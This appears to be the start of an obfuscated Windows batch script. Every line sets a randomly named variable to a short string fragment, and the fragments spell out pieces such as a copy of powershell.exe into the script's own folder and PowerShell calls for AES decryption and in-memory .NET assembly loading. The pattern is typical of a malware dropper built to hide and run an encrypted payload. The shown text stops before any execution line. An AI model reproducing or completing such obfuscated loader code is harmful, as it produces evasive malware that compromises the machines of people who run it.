@echo off
set "QuOCtMWfNu=\v"
set "ywSSQtDJMK=py"
set "TrAhlQCdvP=Wi"
set "FgixtjvKpW=we"
set "uzRsRNgixH=Po"
set "OSxaVucnhw=em"
set "asaduBmBcG=co"
set "DTEuFClWRN=he"
set "hNAqfYStuH=y "
set "EmVSvRmZAZ=in"
set "evcRkRMjRm=0\"
set "HUVsUsLlUS=ll"
set "PemyObbAIB=st"
set "JKZvteqvgA=Sy"
set "aNoBIkKIMU=he"
set "SlZkkYmExb=ll"
set "yMXueULYUO= /"
set "QRuHsqrUER=we"
set "UnbkRFMEtj=s\"
set "NRqayJbKFu=ow"
set "ccoJANdtaK=do"
set "XnLFZlNulb= C"
set "acaTydRUHu=32"
set "fLieNusXsB=rs"
set "kgTniiosuf=ws"
set "hOuinvzqHB=:\"
set "HdyYcMGudi=nd"
set "txzkdXnacQ=1."
set "tGDfFPaCwP=\W"
set "MHCLExtIJn=rS"
set "wbUUgaZIdc=.e"
set "MiNRxjfbaS=po"
set "RhJySSRHPj=xe"
set "ukGsdvEYYG= %~dp0"
set "rFpgBQhvTf=cd"
set "sPWQKDukil=-4] "
set "luWITemhom=rofi"
set "NopBtfMdwV=Star"
set "AcFSvDozOs=y.Pa"
set "JQgNAjuKDR=oL'["
set "UmpZXNsAcq=saBm"
set "PeJxVHDizL=le  "
set "sgJqkUTqdX=)($S"
set "BLWrSlsAFR=m(, "
set "lEUVcdAdyn=i.En"
set "PDxvHWAfvx=Rzqm"
set "qwSmvdTVGt=[-1."
set "AWYMTGoyDZ=RRzq"
set "rozyxweRgX=UGTu"
set "WtuTmxoOlQ=-Obj"
set "BfNiXSgrFt=);$f"
set "IHPjDzrirW=::De"
set "lovKvofOJP=)($m"
set "zgCjKuLZHI=ptor"
set "pJKtWklkwa=rtS4"
set "UImOppDYnQ=:('g"
set "GYfwIScdbr=6] -"
set "kXneZwLhwn=Disp"
set "maeTGUSiOo===')"
set "aHJiietjyt=File"
set "KoOgtQEyMW=);$R"
set "rknRUuYIjw=cd);"
set "LioLCOyuXH=.Ass"
set "kRpWkSRJxR=);$O"
set "KJPmzqwFRx=$UZd"
set "IrVAByenqE=, (,"
set "VghstHVzgk=1] -"
set "iGdFrZujCV=$SRr"
set "IAvHsLROVr=.Dis"
set "LfHHqPUksp=lBlo"
set "FbKFhzqfMi=();$"
set "FXiLbyNDoI=;$GK"
set "lPrMbzHwrf= '')"
set "HSITYRpZfL=PP);"
set "MuHntErBHb=esFX"
set "ITBNYxBBOf=ateD"
set "bLMqcDvVFa=1..-"
set "AqaqILsPxz=ddin"
set "eTlxCnCBFr=yAah"
set "SkufcufnNz=-joi"
set "FjSMgAAGDh=m.IO"
set "VITwsRHwmX=[Sys"
set "QCXRNJAgGE=tem."
set "aQrqKYWaIL=embl"
set "FryaYZdsCa=ispo"
set "wfCLQQziBC=($yA"
set "aGPSZNqICV=SVpB"
